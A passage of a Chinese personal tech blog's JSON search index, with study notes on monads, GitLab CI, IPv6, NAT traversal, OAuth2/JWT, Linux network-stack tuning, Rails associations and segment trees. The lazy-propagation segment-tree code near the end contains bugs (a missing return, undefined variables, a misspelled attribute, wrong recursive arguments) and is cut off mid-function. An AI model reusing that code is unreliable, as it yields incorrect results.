&lt;*&gt; m = Impure $ fmap (&lt;*&gt; m) finstance Functor f =&gt; Monad (Free f) where  return = Pure  Pure a   &gt;&gt;= k = k a  Impure m &gt;&gt;= k = Impure (fmap (&gt;&gt;= k) m)\nfreer monad\nfmap的type是(a -&gt; b) -&gt; f a -&gt; f b\n如果有一個type直接把(a -&gt; b)與f a先存好，是不是就直接是functor，同時利用free monad，就可以生出applicative與monad\n所以有了Lan(freer monad)\ndata Lan g a where  Lan :: g x -&gt; (x -&gt; a) -&gt; Lan g ainstance Functor (Lan g) where  fmap f (Lan gx h) = Lan gx (f . h)lan :: g a -&gt; Lan g alan ga = Lan ga id # return!!\n吃 1. 被打包的值 2. 與轉type的函數\n生freer(Lan)\n這根本就是fmap\n把free monad生出來\ndata FFree g a where  FPure   :: a -&gt; FFree g a  FImpure :: g x -&gt; (x -&gt; FFree g a) -&gt; FFree g aetaF :: g a -&gt; FFree g aetaF fa = FImpure fa FPure\n剩下的部分\ninstance Functor (FFree g) where  fmap f (FPure x)     = FPure (f x)  fmap f (FImpure u q) = FImpure u (fmap f . q)instance Applicative (FFree g) where  pure = FPure  FPure f     &lt;*&gt; x = fmap f x  FImpure u q &lt;*&gt; x = FImpure u ((&lt;*&gt; x) . q)instance Monad (FFree g) where  return = FPure  FPure x      &gt;&gt;= k = k x  FImpure u k&#x27; &gt;&gt;= k = FImpure u (k&#x27; &gt;&gt;&gt; k)\n看lan的fmap的實作會發現，根本只有函數合成而已!!\n這裡可以注意Impure與FImpure\nImpure的目的是把被打包的值轉成Free\n但FImpure本來就是吃被打包的值，那這裡怎麼模擬Impure?\n把被打包的值的type換掉就好!!\nRef\nFree and Freer Monads: Putting Monads Back into Closet\n","categories":["PLT","Tips"]},{"title":"gitlab-ci的一點設定tips","url":"/2021/11/gitlab-ci-tips/","content":"動機\n最近都在用這個，來記錄一下\n\nsubmodule\n如果說submodule都在同一個server，可以用相對路徑，透過gitlab ci的submodule來拉\n[submodule &quot;mymodule&quot;]  path = mymodule  url = ../../mygroup/mymodule.git\nvariables:  GIT_SUBMODULE_STRATEGY: recursive\nshared runner?\nshared runner要套用在group上，但是其實可以把project specific的runner放出來給大家用\n\n到runner\n點進去runner的設定(板手圖案)\n把Lock to current projects...取消掉\n在其他repo的runner就能看到enable this runner了!!\n\n不適合dry?\n我的runner建在公用k8s上，而同時我需要給registry的帳密，這時候就在想應該\n\n在k8s上用serect\n在每個repo都設定同一個帳密\n\n這裡我是偏好在每個repo都設定同一個帳密，因為runner只要設定一次，同時如果之後要改設定可以在repo直接看到，這樣不會影響到其他repo\nRef\nRegister specific runner for multiple projects\nGitLab CI 如何 clone private repository\n","categories":["Utils","CI","Gitlab CI"]},{"title":"ipv6筆記","url":"/2021/11/ipv6-tutorial/","content":"動機\n記錄用\n\n128 bits\n\n自己(Interface ID): 64 (後半)\n\nMAC(前半) + 0xFFFE + MAC(後半)\n\n\n網路: 64 + 64\n\nGlobal Unicast Address: 連到Internet的\n\nGlobal Routing Prefix(48) + Subnet ID(16) + Interface ID(64)\n\nGlobal Routing Prefix: router或是ISP配發的prefix\n\n\n\n\nLink-Local Address: LAN的IP (on link)\n\n0xFE80 + 0…0(48) + Interface ID(64)\n\n\nUnique-Local Address: LAN的IP (on link)\n\n(1111 110) + Local bit(1) + global ID(40) + Subnet ID(16) + Interface ID(64)\n\nLocal bit一般都是1\n\n\n\n\n\n\n\n\n沒有broadcast，多了anycast\n\nUnicast: 就是一般的一對一\nMulticast: 對在group內的host送訊息\nAnycast: 送到最近的主機\n\n自動組態\nNeighbor Discovery Protocol，可以當成dhcp+arp\n藉由ICMPv6完成，ICMPv6還是有ICMP的功能，但多了Neighbor Discovery\nNeighbor Discovery Protocol有下面的功能\nRouter Solicitation(RS): 問default gateway，會觸發RA\nRouter Advertisement(RA): router回default gateway(與IPv6 Prefix)\nNeighbor Solicitation: 問mac或是level 2的資料\nNeighbor Advertisement: reply of NS\nRedirect: router指示要往哪跳\n等等，dns勒\n有三種作法\n\nRA(SLAAC, Stateless Address Auto-configuration)+RDNSS\n\n\nRA給default gateway與IPv6 Prefix\nRDNSS給dns\n\n\nRA+dhcpv6\n\n\nRA給default gateway與IPv6 Prefix\ndhcpv6給dns\n\n又名stateless dhcpv6，因為dhcp不會記有誰拿到IPv6 Prefix\n\n\n\n\ndhcpv6\n\n\nRAS給default gateway\ndhcpv6給dns與IPv6 Prefix\n\n又名stateful dhcpv6\n\n\n\n可以看成RA就一定會有default gateway，剩下看dhcpv6要給什麼\n簡化的header\n重要的放前面，不重要的放後面\n也是藉此達成ipv4的support，可以把ipv4 only的部分放到後面\n4 到 6\nDual Stack Routers: 一次跑兩個stack\nTunneling: 用v4去包\nNAT Protocol Translation: 用NAT轉\nRef\nIPv6位址配發技術介紹\nNeighbor Discovery (ND) 簡介\nIPv6 - Quick Guide\n","categories":["Network","FAQ"]},{"title":"Manacher's Algorithm","url":"/2021/11/manacher-algo/","content":"動機\n\nManacher\n先在每個字之間插一字元，可以把它看成mirror另一半過來\n同時處理回文有兩個case(奇數長度、偶數長度)要看的問題，因為現在任何迴文都是奇數長度\n所以變成可以只追蹤一邊的長度就好，因此m[i]定義為迴文延伸出去的距離\n這樣就與z algorithm很像\n\n確認現在要看的回文中心，是不是在目前已確認的範圍中，如果有就先抄答案\n開始延伸回文長度\n如果延伸後的範圍比現在的大就更新範圍\n\ndef f(s):\tmagic = f&#x27;&#123;&quot;&quot;.join([&quot;&quot;.join(n) for n in zip(&quot;#&quot;*(len(s)+1), s)])&#125;#&#x27;\tm = [0]*len(magic)\tdef canExtend(i):\t\tleft, right = i-m[i]-1, i+m[i]+1\t\tisLegalIdx = 0 &lt;= left and right &lt; len(magic)\t\treturn isLegalIdx and magic[left] == magic[right]\tC, R = 0, 0\tfor i in range(len(magic)):\t\t# mirror ... C ... i ... R\t\t# 只要是在範圍內就是對成就可以直接拿前面的來用\t\t# mirror .. (C+(C-i) .. C) is part of Palindrom\t\t# mirror&#x27;Left .. Left .. (mirror .. R&#x27;).. C .. (i ~ R) is part of Palindrom\t\tif i &lt; R:\t\t\tm[i] = min(R-i, m[C+(C-i)])\t\twhile canExtend(i):\t\t\tm[i]+=1\t\tif i+m[i] &gt; R:\t\t\tC, R = i, i+m[i]\ti, l = max(enumerate(m), key=lambda x: x[1])\t# [i-l ~ i+l] is # a # ... a #\treturn &#x27;&#x27;.join(c for c in magic[i-l:i+l+1] if c != &quot;#&quot;)print(f(&quot;babbad&quot;))\nRef\n\n\n","categories":["Algorithm","Classic"]},{"title":"min max對役","url":"/2021/11/minmax/","content":"動機\n\nminmax\n在局面確定的雙人對弈裡，常進行對抗搜索，構建一棵每個節點都為一個確定狀態的搜索樹。奇數層為己方先手，偶數層為對方先手。搜索樹上每個葉子節點都會被賦予一個估值，估值越大代表我方贏面越大。\n一層從children中挑大的node，下一層就是從children中挑小的node\n之後就是前序去更新上下界，如果下界大於上界就是此點不用再找了\n\n\ndef minmax(root, a, b, isMax):    if not root.children:        return root.val    if isMax:        for node in root.children:            a = max(a, minmax(node, a, b, not isMax)) # 挑最大，變下界            if a &gt;= b: # 不用再看了                break        return a     else:        for node in root.children:            b = min(b, minmax(node, a, b, not isMax)) # 挑最小，變上界            if a &gt;= b: # 不用再看了                break        return b","categories":["Algorithm","Classic"]},{"title":"nat穿隧筆記","url":"/2021/11/nat-traversal-tutorial/","content":"動機\n記錄用\n\nnat type\n\n完全圓錐型NAT: in-ip &lt;-&gt; out-ip&amp;port\n\n受限圓錐型NAT: whitelist out-ip (dont care port)\n\n埠受限圓錐型NAT: whitelist out-ip&amp;port\n\n\n\n\n對稱NAT: 每次的req的port都不一樣!!\n\nSTUN\n讓client知道\n\n在外部網路的位址(也就是Inside Global位址)\n目前的NAT是使用怎樣的NAT種類\n\n在不同範圍的ip有不同的名字\n{inside local} )PC( {inside global} {outside local} )ISP( {outside global}\nTURN\n只有STUN沒辦法與對面的nat中的server連線，所以讓STUN多了relay的功能\nudp打洞\n\nmid server做筆記紀錄兩邊的out-ip&amp;port\n讓client查對方的out-ip&amp;port\nclient都先丟udp到server，第一次會被drop\n\n\n但是本機的nat會記錄連線\n\n\n換對面丟，因為有紀錄連線就會過\n\nRef\n明辨STUN/TURN協定　輕鬆跨越NAT建立連線\n简单解释 P2P 技术之 UDP 打洞\n","categories":["Network","FAQ"]},{"title":"oauth2、openid、jwt筆記","url":"/2021/11/oauth2-openid-jwt/","content":"動機\n記錄用\n\n授權 &amp; 驗證\n驗證(authentication): 確認身分 (openid)\n授權(Authorization): 可以使用某個資源 (oauth2)\noauth2\n有4種流程\nauthorization code流程是\n\n使用者(resource owner)透過browser(user-agent)連到app(client)\napp redirect到google的server(Authorization Server)\ngoogle登入、approve可以用這方面的資源\ngoogle給redirect url與authorication code\nbrowser做redirect，讓app收到authorication code\napp再用authorication code去換access token!!\n用access token拿google上的資源(Resource Server)\n\n整個最重要的是\n\n拿authorication code\n用authorication code換access token\n\n還有其他(簡化)流程，像\n\n(Resource Owner Password Credentials Grant) 把帳密給app讓他直接與Authorization Server拿access token\n(Client Credentials Grant) 只有app與Authorization Server，其實就是一般的登入\n(implicit grant type) 剩下一種是讓browser把authorication code自己在換出access token，之後給app\n\nopenid\nopenid是驗證身分，流程類似oauth2但是最後傳的東西不只是資源，還有對面的(google的)用戶識別資訊，簡單來說就是把別人的user當成自己的user用\noath2是授權，所以不同server的資源都不一樣，導致scope都不一樣\n但openid是驗證，所以user權限(scope)會是通用的\n整個流程與authorization code流程很像，但是最後傳的是id token，以及server的user識別訊息\n\n另外提Single Sign On (SSO)，就是openid完成的事，透過其他server完成使用者驗證\njwt\n就是token的格式\ntoken有user的資訊，就可以不用session另外map到user去\nformat是標頭.內容.簽名\n標頭: 加密algo, token種類\n內容: json data\n簽名: 把標頭.內容用私鑰加密的結果\n或是反著用，用公鑰加密，但是用私鑰解密，但是會變得很複雜，可以看這邊\nRef\n理解OAuth 2.0\n每當點選社群帳號登入，背後發生了什麼事？\n以 JSON Web Token 替代傳統 Token\n","categories":["Rails","FAQ"]},{"title":"packet在linux中走過的路2","url":"/2021/11/path-of-packet-in-linux2/","content":"動機\n算是packet在linux中走過的路的延伸\n\nin\ndevice init\nmodule_init =&gt;\n當設備驅動編譯時，MODULE_DEVICE_TABLE會導出一個 PCI 設備 ID 列表，驅動據此識別它可以控制的設備，內核也會依據這個列表對不同設備加載相應驅動。\n通過 PCI ID 識別設備後，內核就會為它選擇合適的驅動。\nprobe()\n\n啟用 PCI 設備\n請求（requesting）內存範圍和 IO 端口\n設置 DMA 掩碼\n註冊設備驅動支持的 ethtool 方法（後面介紹）\n註冊所需的 watchdog（例如，e1000e 有一個檢測設備是否freeze的 watchdog）\n其他和具體設備相關的事情，例如一些 workaround，或者特定硬件的非常規處理\n創建、初始化和註冊一個 struct net_device_ops 類型變量，這個變量包含了用於設 備相關的回調函數，例如打開設備、發送數據到網絡、設置 MAC 地址等\n創建、初始化和註冊一個更高層的 struct net_device 類型變量（一個變量就代表了 一個設備）\n\n驅動的硬中斷處理函數做的事情很少，但軟中斷將會在和硬中斷相同的 CPU 上執行。\n這就是為什麼給每個 CPU 一個特定的硬中斷非常重要：這個 CPU 不僅處理這個硬中斷，而且通過 NAPI 處理接下來的軟中斷來收包。\n可以設定cpu affinity，讓localty上升，Set the IRQ affinity for IRQ 8 to CPU 0\necho 1 &gt; /proc/irq/8/smp_affinity\ndevice bring up\nigb_open =&gt;\n\n分配 RX、TX 隊列內存\n\n有些網卡支援Receive Side Scaling（RSS，接收端擴展）或者多隊列（ multiqueue）\n\n\n打開 NAPI 功能 (一次收多一點)\n\n在一個單獨的線程裡，調用驅動註冊的 poll 方法收包\n驅動禁止網卡產生新的硬件中斷。這樣做是為了 NAPI 能夠在收包的時候不會被新的中 斷打擾\n一旦沒有包需要收了(或是收滿了,weight滿了)，NAPI 關閉，網卡的硬中斷重新開啟\n\n\n註冊中斷處理函數\n\n/proc/softirqs\nMSI-X\n\n因為每個 RX 隊列有獨 立的MSI-X 中斷，因此可以被不同的 CPU 處理（通過 irqbalance 方式，或者修改 /proc/irq/IRQ_NUMBER/smp_affinity）\n\n\nMSI\nlegacy IRQ\n\n\n打開（enable）硬中斷\n\n“Interrupt Throttling”（也叫 “Interrupt Coalescing”）的硬件 特性相關，這個特性可以平滑傳送到 CPU 的中斷數量\nInterrupt coalescing 中斷合併會將多個中斷事件放到一起，累積到一定閾值後才向 CPU 發起中斷請求。\n\n這可以防止中斷風暴，提升吞吐，降低 CPU 使用量，但延遲也變大；中斷數量過多則相反。\nethtool -C eth0 adaptive-rx on: 自適應 RX IRQ 合併\n\n\ncat /proc/interrupts\n\n\n網絡設備子系統的初始化 (net_dev_init)\n\nstruct softnet_data 變量初始化\n\n需要註冊到這個 CPU 的 NAPI 變量列表\n數據處理 backlog\n處理權重\nreceive offload 變量列表\nreceive packet steering 設置\n\n\n註冊SoftIRQ\n\nNET_TX_SOFTIRQ =&gt; net_tx_action\nNET_RX_SOFTIRQ =&gt; net_rx_action\n\n\n\n\nmonitor\n\nethtool -S\ncat /sys/class/net/&lt;NIC&gt;/statistics/&lt;item&gt;\n/proc/net/dev\n所有顯示的項目都是由driver定義的，所以不同driver同樣item的意思可能不同\n\n\ntuning\n\n調整queue\n\nRX queue的數量\nRX queue的大小\nRX queue的權重\nRX queue的hash (讓pkt到不同的queue)\n\n\nntuple filtering\n\n在NIC上做過濾，steer到指定的queue\n\n\n\n\n\ninet開始收資料\n先irq(igb_msix_ring)去要求跑sortirq，之後會帶到對應的softirq\nnet_rx_action 從包所在的內存開始處理，包是被設備通過 DMA 直接送到內存。\nsoftirq透過NAPI(igb_poll)去讀，讀完就會解綁（unmap）這些內存，讀取數據，將數據送到napi_gro_receive，之後到下一層(tap或是ip，如果中間有RPS，會先過RPS)。\n有趣的是這裡的NAPI的weight寫死成64\nmonitor:\n/proc/net/softnet_stat\n沒有title，這要直接看kernel code， net/core/net-procfs.c\n每一行代表一個 struct softnet_data 變量。因為每個 CPU 只有一個該變量，所以每行 其實代表一個 CPU\n每列用空格隔開，數值用 16 進製表示\n第一列 sd-&gt;processed，是處理的網絡幀的數量。如果你使用了 ethernet bonding， 那這個值會大於總的網絡幀的數量，因為 ethernet bonding 驅動有時會觸發網絡數據被 重新處理（re-processed）\n第二列，sd-&gt;dropped，是因為處理不過來而 drop 的網絡幀數量。後面會展開這一話題\n第三列，sd-&gt;time_squeeze，前面介紹過了，由於 budget 或 time limit 用完而退出 net_rx_action 循環的次數\n接下來的 5 列全是 0\n第九列，sd-&gt;cpu_collision，是為了發送包而獲取鎖的時候有衝突的次數\n第十列，sd-&gt;received_rps，是這個 CPU 被其他 CPU 喚醒去收包的次數\n最後一列，flow_limit_count，是達到 flow limit 的次數。 flow limit 是 RPS 的特性， 後面會稍微介紹一下\ntune: 調整 net_rx_action budget\n* net.core.netdev_budget=600\nGRO（Generic Receive Offloading）\nLarge Receive Offloading (LRO) 是一個硬件優化，GRO 是 LRO 的一種軟件實現。\n如果用 tcpdump 抓包，有時會看到機器收到了看起來不現實的、非常大的包， 這很可能是你的系統開啟了 GRO。\ntcpdump 的抓包點（捕獲包的 tap ）在整個棧的更後面一些，在GRO 之後。\nNIC(與linux的level2)到IP之間\ndev_gro_receive 完成，napi_skb_finish 就會被調用，之後就是走\nnetif_receive_skb 或者繼續將包送到協議棧，或者交給 RPS，後者會轉交給其他 CPU 處理。\nRPS (Receive Packet Steering)\nRPS （Receive Packet Steering，接收包控制，接收包引導）是 RSS 的一種軟件實現\n因為它是軟件實現的，這意味著 RPS 只能在 packet 通過 DMA 進入內存後，RPS 才能開始工 作。\nRPS 並不會減少 CPU 處理硬件中斷和 NAPI poll（軟中斷最重要的一部分）的時 間，但是可以在 packet 到達內存後，將 packet 分到其他 CPU，從其他 CPU 進入協議棧。\nRPS 的工作原理是對個 packet 做 hash，以此決定分到哪個 CPU 處理。然後 packet 放到每個 CPU 獨占的接收後備隊列（backlog）等待處理。這個 CPU 會觸發一個進程間中斷（ IPI，Inter-processor Interrupt）向對端 CPU。如果當時對端 CPU 沒有在處理 backlog 隊列收包，這個進程間中斷會 觸發它開始從 backlog 收包。 /proc/net/softnet_stat 其中有一列是記錄 softnet_data 變量（也即這個 CPU）收到了多少 IPI（received_rps 列）。\ntune: /sys/class/net/DEVICE_NAME/queues/QUEUE/rps_cpus\nRFS (Receive Flow Steering)\nRFS 将属于相同 flow 的包送到相同的 CPU 进行处理，可以提高缓存命中率。\necho 2048 &gt; /sys/class/net/eth0/queues/rx-0/rps_flow_cnt\nsysctl -w net.core.rps_sock_flow_entries=32768\naRFS (Hardware accelerated RFS)\nRFS 可以用硬件加速，網卡和內核協同工作，判斷哪個 flow 應該在哪個 CPU 上處理。\n這個要開RFS與kernel要編CONFIG_RFS_ACCEL，ntuple也要開，最後配置 IRQ（硬中斷）中每個 RX 和 CPU 的對應關係\n到linux的level2 (协议栈)\n從netif_receive_skb過來\n先當成有RPS，pkt就會到cpu的backlog(enqueue_to_backlog)，之後NAPI的poller會去拉(process_backlog)，可以把cpu當成另一種網卡\n另外有flow limit，避免cpu被打爆\n最後做gro(napi_gro_complete)\n等到了cpu的backlog queue，NAPI poller就會去拉pkt\nbacklog NAPI 變量和設備驅動 NAPI 變量的不同之處在於，它的 weight 是可以調節的，而設備 驅動是 hardcode 64。\nmonitor: 由於 input_pkt_queue 打滿或 flow limit 導致的丟包\n* /proc/net/softnet_stat 裡面的 dropped\ntune:\n* RX packet timestamping\n* net.core.netdev_tstamp_prequeue=0\n* 調cpu backlog:\n* net.core.netdev_max_backlog=3000\n* 讓NAPI能一次拿更多pkt(wieght)\n* net.core.dev_weight=600\n* 調flow limit的table size\n* net.core.flow_limit_table_len=8192\n* 打開flow limit\n* /proc/sys/net/core/flow_limit_cpu_bitmap\n最後的最後，__netif_receive_skb_core把pkt送到抓包點（tap）或協議層\n到目前為止的流程\nNIC -&gt;(DMA,irq) driver -&gt;(NAPI,sortirq) gro -&gt; RPS -&gt;(NAPI) tap/IP\n到IP\nip_rcv之後就是netfilter(NF_HOOK)的prerouting，ip_rcv_finish(early_demux)\n就可以往上走了!!\nearly_demux\n如果這個優化打開了，但是並沒有命中緩存（例如，這是第一個包），這個包就會被送到內 核的路由子系統，在那裡將會計算出一個 dst_entry 並賦給相應的字段\n所以應該能猜，沒開就是每次都去查?\ntune: 把early_demux關了(也許需要)\n\nnet.ipv4.ip_early_demux=0\n\n如果是自己的pkt?\nip_local_deliver處理，過netfilter，到ip_local_deliver_finish\nmonitor:\n\n/proc/net/snmp\n\nInReceives: ip_rcv收到多少pkt\nInHdrErrors: 多少ip header壞了\nInAddrErrors: 多少pkt的addr是到不了的\nForwDatagrams: forwarded的ip pkt\nInUnknownProtos: 多少是protocol不明的\nInDiscards: 多少pkt被丟了(也許是mem alloc失敗，也許是checksum error)\nInDelivers: 多少pkt成功往上送\nInCsumErrors: 多少pkt是checksum error\n到udp\nudp_rcv\n\n這裡會看pkt與他的dst_entry(routing的結果)，送到socket的backlog\n\ntune:\n\nSocket receive queue memory\n\nnet.core.rmem_max=8388608\nnet.core.rmem_default=8388608\n或是用setsockopt帶\nmonitor:\n\n\n/proc/net/snmp\n/proc/net/udp\n\n/proc/net/snmp\nInDatagrams: 總共有多少udp pkt進入或流出\nNoPorts: 總共有多少udp pkt的dport是沒有人在聽的\nInErrors: 多少udp pkt有錯誤(也許是mem alloc失敗，也許是checksum error)\nOutDatagrams: 多少pkt成功往下送\nRcvbufErrors: 有多少pkt是因為rcv buffer爆了而塞不進去\nSndbufErrors: 有多少pkt是因為send buffer爆了而塞不進去\nInCsumErrors: 多少pkt是checksum error\n/proc/net/udp\nsl: Kernel hash slot for the socket\nlocal_address: local addr\nrem_address: remote addr\nst: socket的狀態\ntx_queue: tx queue的大小\nrx_queue: rx queue的大小\ntr, tm-&gt;when, retrnsmt: 這些應該retry與retransmit\nuid: 創這個socket的uid\ntimeout: 應該是tcp的timeout\ninode: socket的inode\nref: reference count\npointer: socket的address\ndrops: 這個socket的drop\nsocket\nsock_queue_rcv收pkt，sk_data_ready通知socket\nout\nsocket\nsentto，會走到sock_sendmsg，之後看socket是AF_INET，走道inet_sendmsg\n之後就是走到udp_sendmsg\nudp\n拿dip,dport，處理unicast或mutilcast，之後就是routing??，生skb(ip_make_skb)，丟給udp_send_skb\n怎麼感覺有偷跑的感覺在??\nip\nip_send_skb收到pkt，ip_local_out，netfilter(local_out)，routing(拿dst_entry)，ip_output，netfilter(post_routing)，ip_finish_output\nip_finish_output，通常是\n\nip_fragment，之後ip_finish_output2\n直接ip_finish_output2\n\nip_finish_output2會去調arp(鄰居系統)\nPath MTU Discovery\n此功能允許內核自動確定 路由的最大傳輸單元（ MTU ）。\n調用 setsockopt 帶 SOL_IP 和 IP_MTU_DISCOVER\nlinux level2 (TC)\ndev_queue_xmit，之後就是找TX queue的旅程(netdev_pick_tx)，拿到TX queue找對應的qdisc，之後到dev_hard_start_xmit，會去跑qdisc，再到sch_direct_xmit-&gt;dev_hard_start_xmit\n任何無法發送的 skb 都重新入隊，將在 NET_TX softirq 中進行 發送。\n__netif_schedule發tx的irq\n\nsortirq: net_tx_action\n\ncompletion queue: 待釋放 skb 隊列\noutput queue: 待發送 skb 隊列\n\n之後到dev_hard_start_xmit\n\n發送數據花費的總時間是下面二者之和\n\n系統調用的系統時間(sys time)\nNET_TX 類型的 softirq 時間（softirq time）\n\n\n\n\n\n\n\n\ndev_hard_start_xmit\n\ndev_queue_xmit_nit: copy skb到tap(pcap)\nops-&gt;ndo_start_xmit: 到device去\n\n\n\nmonitor: tc -s qdisc show dev eth1\nbytes: driver總共傳了多少bytes\npkt: driver總共傳了多少pkt\ndropped: qdisc drop多少pkt\noverlimits: 有多少pkt是因為這個qdisc的策略而被去掉的(queue爆了或是有pkt出queue時去清)\nrequeues: 有多少pkt是重新入queue(像是driver丟不出去就會重新入queue)\nbacklog: 現在queue多長\n你可以調整前面看到的__qdisc_run 循環的權重（上面看到的 quota 變量），這將導致 __netif_schedule 更多的被調用執行。結果將是當前 qdisc 將被更多的添加到當前 CPU 的 output_queue，最終會使發包所佔的時間變多。\ntune:\n\n調整__qdisc_run 處理權重\n\nnet.core.dev_weight=600\n\n\n增加發送隊列長度\n\nifconfig eth0 txqueuelen 10000\n\n\n\nTransmit Packet Steering (XPS)\n發送數據包控制（XPS）是一項功能，允許系統管理員配置哪些 CPU 可以處理網卡的哪些發送 隊列。 XPS 的主要目的是避免處理髮送請求時的鎖競爭。使用 XPS 還可以減少緩存驅逐， 避免NUMA機器上的遠程 內存訪問等。\ntune:\n/sys/class/net/DEVICE_NAME/queues/QUEUE/xps_cpus\nNIC\n到了driver的igb_xmit_frame_ring，再到igb_tx_map將 skb 數據映射到 RAM 的 DMA 區域\n完成傳送之後device送完pkt就會丟irq\n對於 igb 驅動程序（及其關聯設備），發送完成和數據包接收所觸發的 IRQ 是相同的。這意味著 對於 igb 驅動程序，NET_RX 既用於處理髮送完成，又用於處理數據包接收。\n如果是這種情況，則 NET_RX softirq 會被用於 處理數據包接收和發送完成兩種情況。\n在NAPI做poll(igb_poll)時會去清已完成的pkt(igb_clean_tx_irq)\nDynamic Queue Limits (DQL)\nDQL 內部算法判斷何時數據已足夠多，達到此閾值後，DQL 將暫時禁用 TX Queue，從而對網絡系統產生背壓。當足夠的數據已發送完後，DQL 再自動重新啟用該隊列。\nmonitor:\n/sys/class/net/&lt;NIC&gt;/queues/tx-&lt;QUEUE_ID&gt;/byte_queue_limits/*\nhold_time: 類似tcp的timeout，如果queue一直滿到一定時間(以HZ為單位)就去縮小queue的最大長度\ninflight: number of packets queued - number of packets completed\nlimit_max: (寫死) DQL_MAX_LIMIT (1879048192 on my x86_64 system)\nlimit_min: (寫死) 0\nlimit: 介於limit_min與limit_max之間，代表queue的最大長度\nRef\n[译] Linux 网络栈监控和调优：接收数据（2016）\nIllustrated Guide to Monitoring and Tuning the Linux Networking Stack: Receiving Data\nMonitoring and Tuning the Linux Networking Stack: Receiving Data\n[译] Linux 网络栈监控和调优：发送数据（2017）\nMonitoring and Tuning the Linux Networking Stack: Sending Data\nlinux网络实现分析(1)——数据包的接收（从网卡到协议栈）\nlinux网络实现分析(3)——数据包的发送（IP层到链路层）\nThe packet flow, from userspace to kernel driver in Linux network stack\n","categories":["Network","FAQ"]},{"title":"rails的關聯","url":"/2021/11/rails-relationships/","content":"動機\n記錄用\n\nsql的關聯 &amp; object的attribute\n在sql只有外鍵，所以只有關聯。\n但如果來到程式中，用attribute存取時，關聯到的個數會是問題。\nsql要等join才會知道數量，但是程式的attribute基本上只能bind到一個資料。\n但如果一次關聯到很多筆?\n就不能只用attribute直接bind，要放到array\n但程式中，attibute與array是截然不同，要先講好\nhas_one, has_many, belongs_to\n從上面的分析，可以對應到關聯的3個函數\n\nbelongs_to\n\n\n標明外鍵\n\n\nhas_one\n\n\n用attribute去存\n\n\nhas_many\n\n\n用array去存\n\nmany 2 many?\n可以看成兩個table互指\n但這樣會變成一個物件要放array到table，這不太可能\n所以做1NF，轉成直的\n直的之後物件會有一堆重複，所以可以抽到另一個表(2NF)\n所以就是雙方has_many，用同一張表去找關聯\n這樣可以把many 2 many當成c的pointer2pointer\n","categories":["Rails","FAQ"]},{"title":"區間問題","url":"/2021/11/range-problem/","content":"動機\n記錄用\n\n區間問題是?\n就是給個數列，之後做 修改、查詢\n不論修改、查詢都可以做 單點、範圍\n分類\n\n區間修改、區間查詢：線段樹 + 懶人標記\n區間修改、單點查詢：BIT + 差分\n單點修改、區間查詢：線段樹／BIT\n區間修改、沒有查詢：差分\n沒有修改、區間查詢：前綴和／稀疏表\n\n差分\n做很多次區間修改，之後一直查詢\n有沒有一種方法可以讓修改影響到右邊的數字?\n這就要提到差分的特性。\n差分定義成D_i = A_i - A_i-1\n根據上面的定義可以看到如果sum(D[x] for x in range(i))，就會是A_i，因為其他值會被差分扣掉\n所以只要D_i的其中一個有被加新數字，就會影響到這個數字!!\n這樣如果要修改range([l,r))就是D_l + diff 與 D_r - diff，之後做prefix sum就能回答了!!\n離散化\n之前有提到分塊，也就是把資料分組\n離散化就是把資料再細分，像是如果數字有重複，就依據原本的位置再上新的編號\nLCA 與 Range Minimum Query\n如果把一顆tree用dfs走一遍，並在每一次遇到時記下點的編號\n並把第一次的編號當成該點的position\nidx = []pos = &#123;&#125;acc = 0def dfs(root):  if root:    idx.append(acc)    pos[root] = acc if root not in pos else pos[root]    [dfs(child) for child in root.children]\n那這樣LCA就是在idx中pos[a] ~ pos[b]範圍的最小值，因為從a到b一定會過LCA，同時LCA也是pos最小的!!\nRef\n區間問題概述\n最近公共祖先\n","categories":["Algorithm","Tips"]},{"title":"線段樹","url":"/2021/11/segment-tree/","content":"動機\n其實線段樹的花樣很多\n\n基本款\n每個點都放區間的\n\n起點\n終點\n總值\n左右child\n\nclass Node:    def __init__(self,i,j,val):        self.i = i        self.j = j # i &lt; j, always        self.mid = i + (j-i) // 2        self.val = val        self.left = None        self.right = None\n建構就是top-down去二分\n這邊可以注意的是，只要是有結合律的都可以用在segment tree!!\n在此是用sum來示範\ndef build(arr,i,j):    if i &gt;= j:        return Node(i,j,0)    elif j-i == 1:        return Node(i,j,arr[i])    else:        mid = i + (j-i) // 2        root = Node(i,j,&#x27;wait for left and right&#x27;)        root.left = build(arr, i, mid)        root.right = build(arr, mid, j)        root.val = root.left.val + root.right.val        return root\nquery根據node的中點分成3個case\n\n完全在左\n完全在右\n卡在中間\n\n剩下就是非法range與剛好是這個node的range\ndef query(root,i,j):    if not root or i &lt; 0 or j &lt; 0:        return 0    if i == root.i and root.j == j:        return root.val    elif j &lt; root.mid:        return query(root.left, i, j)    elif i &gt; root.mid:        return query(root.right, i ,j)    else:        return query(root.left, i, root.mid)+query(root.right, root.mid, j)\n如果說要改其中一個index的值就有點麻煩\n因為要把修改傳上去，所以要回傳差值\ndef update(root,i,val):    if root.i == i and root.j-root.i == 1:        diff = val - root.val # new - old = diff =&gt; new = old + diff        root.val = val        return diff    else:        if i &lt; root.mid:            diff = update(root.left, i, val)        else:            diff = update(root.right, i, val)        root.val += diff        return diff\n懶人標記\n如果要改一個range，對每個點用單點修改，效率超低，所以要用懶人標記\n懶人標記有兩種做法，區分是會不會改到原本的資料\n原本資料不變\n一次替整個range加上某個值\n因為原本的值沒有變，所以可以用一個cache存差值，之後就是在查詢時把差值加上去\nclass Node:    def __init__(self,i,j,val):        self.i = i        self.j = j # i &lt; j, always        self.mid = i + (j-i) // 2        self.val = val        self.left = None        self.right = None        self.cache = 0def query(root,i,j):    if not root or i &lt; 0 or j &lt; 0:        return 0    else:      ret = root.cache*(j-i)      if i == root.i and root.j == j:          ret += root.val      elif j &lt; root.mid:          ret += query(root.left, i, j)      elif i &gt; root.mid:          ret += query(root.right, i ,j)      else:          ret += query(root.left, i, root.mid)+query(root.right, root.mid, j)def update(root,i,j,val):    if root.i == i and root.j == j:        root.cache += val    else:        if i &lt; root.mid:            update(root.left, i, val)        else:            update(root.right, i, val)\n改原本資料\n現在變成要一次把一個range的資料都改成同一個數字\n但總不能一個一個改，所以可以在node留訊息，等之後有人經過再真的去改自己的資料，並把改變往下推\nclass Node:    def __init__(self,i,j,val):        self.i = i        self.j = j # i &lt; j, always        self.mid = i + (j-i) // 2        self.val = val        self.left = None        self.right = None        self.changed = False        self.newVal = 0        def push(self):        self.val = self.newVal*(j-i)        self.left.changed = self.right.change = True        self.left.newVal = self.right.newVal = self.newVal        self.newVal, self.changed = 0, Falsedef query(root,i,j):    if not root or i &lt; 0 or j &lt; 0:        return 0    root.push()    if i == root.i and root.j == j:        return root.val    elif j &lt; root.mid:        return 